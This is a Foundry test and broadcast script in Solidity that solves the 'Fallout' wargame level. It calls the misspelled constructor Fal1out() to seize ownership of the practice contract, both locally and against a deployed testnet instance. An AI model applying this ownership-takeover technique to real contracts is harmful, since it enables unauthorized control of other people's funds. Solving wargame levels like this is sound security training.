// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "./Instance.sol";

contract Clear is Test {
    Fallout private _instance;
    address payable private _player;

    function setUp() external {
        _instance = new Fallout();
        _player = payable(vm.envAddress("PLAYER"));
    }

    function testLocal() external {
        address tester = vm.addr(1);
        vm.prank(tester);
        _instance.Fal1out();
        assertEq(_instance.owner(), tester);
    }

    function testFork() external {
        vm.createSelectFork(vm.rpcUrl("rinkeby"));
        _instance = Fallout(vm.envAddress("FALLOUT"));
        vm.startPrank(_player);
        _instance.Fal1out();
        assertEq(_instance.owner(), _player);
        vm.stopPrank();
    }

    function run() external {
      vm.startBroadcast();
      _instance = Fallout(vm.envAddress("FALLOUT"));
      _instance.Fal1out();
      assertEq(_instance.owner(), _player);
      vm.stopBroadcast();
    }
}
